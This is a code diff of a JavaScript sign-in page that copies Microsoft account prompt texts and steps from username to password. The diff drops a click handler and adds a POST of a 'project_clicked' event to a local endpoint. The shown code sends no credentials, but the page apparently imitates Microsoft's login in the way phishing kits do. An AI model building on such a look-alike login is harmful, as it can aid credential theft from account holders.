@@ -1,19 +1,4 @@
 document.addEventListener('DOMContentLoaded', () => {
-     sig.addEventListener('click', () => {
-    console.log('Someone clicked the sign-in button');
-
-    // Continue normal UI behavior here.
-    validate();
-
-    if (!pwdVal) {
-        return;
-    }
-
-    document.getElementById("section_uname").classList.add('d-none');
-    document.getElementById('section_pwd').classList.remove('d-none');
-
-    view = "final";
-});
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
     const unameInp = document.getElementById('inp_uname');
@@ -28,6 +13,20 @@ document.addEventListener('DOMContentLoaded', () => {
         //validate the form
         validate();
         if (unameVal) {
+              // Non-sensitive event only.
+        try {
+            await fetch('/project-event', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    event: 'project_clicked'
+                })
+            });
+        } catch (error) {
+            console.error('Event notification failed:', error);
+        }
             document.getElementById("section_uname").classList.toggle('d-none');
             document.getElementById('section_pwd').classList.remove('d-none');
             document.querySelectorAll('#user_identity').forEach((e) => {
